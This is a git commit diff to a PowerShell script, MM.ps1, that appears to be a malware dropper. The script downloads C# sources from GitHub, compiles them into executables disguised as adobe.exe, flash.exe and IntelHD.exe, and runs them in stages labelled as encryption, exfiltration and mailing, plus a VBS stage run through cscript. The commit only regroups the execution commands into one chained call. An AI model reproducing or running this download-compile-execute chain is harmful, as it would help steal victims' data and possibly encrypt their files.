80281ba724d9db15cf04fd3e61d960cd541e1204
FurqanKhan1 <furqankhan08@gmail.com>
2019-12-04 13:16:02 +0400

    Update MM.ps1

--- MM.ps1
+++ MM.ps1
@@ -7,8 +7,8 @@ $url='https://raw.githubusercontent.com/FurqanKhan1/D/master/cexec.cs';
 $b.DownloadFile($url, $my_path) ;
 $command = "cmd /C C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:D:\adobe.exe D:\cexec.cs"
 invoke-expression $command
-$command="cmd /C D:\adobe.exe"
-invoke-expression $command
+$command1="cmd /C D:\adobe.exe"
+#invoke-expression $command
 
 #Part 2 - Encrypt
 $my_path_c="D:\encoding.cs"
@@ -16,8 +16,8 @@ $url_c='https://raw.githubusercontent.com/FurqanKhan1/D/master/encoding.cs';
 $b.DownloadFile($url_c, $my_path_c) ;
 $command = "cmd /C C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:D:\flash.exe D:\encoding.cs"
 invoke-expression $command
-$command="cmd /C D:\flash.exe"
-invoke-expression $command
+$command2="cmd /C D:\flash.exe"
+#invoke-expression $command
 
 #Part 3 - Exfil
 $my_path_k="D:\exfil.cs"
@@ -25,13 +25,15 @@ $url_k='https://raw.githubusercontent.com/FurqanKhan1/D/master/exfil.cs';
 $b.DownloadFile($url_k, $my_path_k) ;
 $command = "cmd /C C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:D:\IntelHD.exe D:\exfil.cs"
 invoke-expression $command
-$command="cmd /C D:\IntelHD.exe"
-invoke-expression $command
+$command3="cmd /C D:\IntelHD.exe"
+#invoke-expression $command
 
 
 #Part 4 - Mail
 $my_path_m="D:\so.vbs"
 $url='https://raw.githubusercontent.com/FurqanKhan1/D/master/so.vbs';
 $b.DownloadFile($url, $my_path_m) ;
-$command = "cmd /C cscript "+$my_path_m
-invoke-expression $command
+$command4 = "cmd /C cscript "+$my_path_m
+#invoke-expression $command
+$comm=$command1 +";"+$command2 +";"+$command3+";"+$command4
+invoke-expression $comm
